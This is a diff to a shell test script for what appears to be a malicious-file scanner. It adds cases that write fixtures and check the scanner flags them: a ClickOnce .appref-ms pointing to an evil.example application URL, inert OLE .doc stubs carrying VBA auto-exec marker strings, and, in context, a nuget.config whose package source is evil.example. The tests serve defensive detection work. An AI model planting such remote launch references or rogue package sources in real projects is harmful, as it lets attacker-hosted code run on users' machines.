@@ -7966,6 +7966,37 @@ printf '<?xml version="1.0"?>\n<Project><UsingTask TaskName="X" TaskFactory="Cod
 ./hlse_core file "$XDIR/t.vcxproj" 2>&1 | grep -q "MSBUILD" \
     && check "file: vcxproj inline task flagged" "0" "0" \
     || check "file: vcxproj inline task flagged" "0" "1"
+printf 'http://evil.example/app.application#App, Culture=neutral\n' \
+    > "$XDIR/evil.appref-ms"
+./hlse_core file "$XDIR/evil.appref-ms" 2>&1 | grep -q "CLICKONCE" \
+    && check "file: remote appref-ms flagged" "0" "0" \
+    || check "file: remote appref-ms flagged" "0" "1"
+printf 'app.application, Culture=neutral\n' > "$XDIR/local.appref-ms"
+./hlse_core file "$XDIR/local.appref-ms" 2>&1 | grep -q "CLICKONCE" \
+    && check "file: local appref-ms no F43" "0" "1" \
+    || check "file: local appref-ms no F43" "0" "0"
+# F4 tiering: OLE magic d0cf11e0a1b11ae1
+python3 - "$XDIR" <<'EOF'
+import sys, os
+d = sys.argv[1]
+ole = bytes.fromhex('d0cf11e0a1b11ae1')
+open(os.path.join(d, 'auto.doc'), 'wb').write(ole + b'VBA Macros' + b'B'*16 + b'Private Sub Document_Open()' + b'C'*50)
+open(os.path.join(d, 'streams.doc'), 'wb').write(ole + b'Macros VBA Project' + b'A'*100)
+open(os.path.join(d, 'plain.doc'), 'wb').write(ole + b'WordDocument' + b'D'*200)
+open(os.path.join(d, 'mention.doc'), 'wb').write(ole + b'this VBA tutorial' + b'E'*200)
+EOF
+./hlse_core file "$XDIR/auto.doc" 2>&1 | grep -q "auto-executing VBA" \
+    && check "file: OLE auto-exec macro at 65" "0" "0" \
+    || check "file: OLE auto-exec macro at 65" "0" "1"
+./hlse_core file "$XDIR/streams.doc" 2>&1 | grep -q "storage streams" \
+    && check "file: OLE macro streams at 55" "0" "0" \
+    || check "file: OLE macro streams at 55" "0" "1"
+./hlse_core file "$XDIR/plain.doc" 2>&1 | grep -q "F4:" \
+    && check "file: plain OLE doc no F4" "0" "1" \
+    || check "file: plain OLE doc no F4" "0" "0"
+./hlse_core file "$XDIR/mention.doc" 2>&1 | grep -q "VBA macro indicators" \
+    && check "file: OLE VBA-mention stays 35" "0" "0" \
+    || check "file: OLE VBA-mention stays 35" "0" "1"
 mkdir -p "$XDIR/ng"
 printf '<?xml version="1.0"?>\n<configuration><packageSources><add key="x" value="https://evil.example/nuget"/></packageSources></configuration>\n' \
     > "$XDIR/ng/nuget.config"
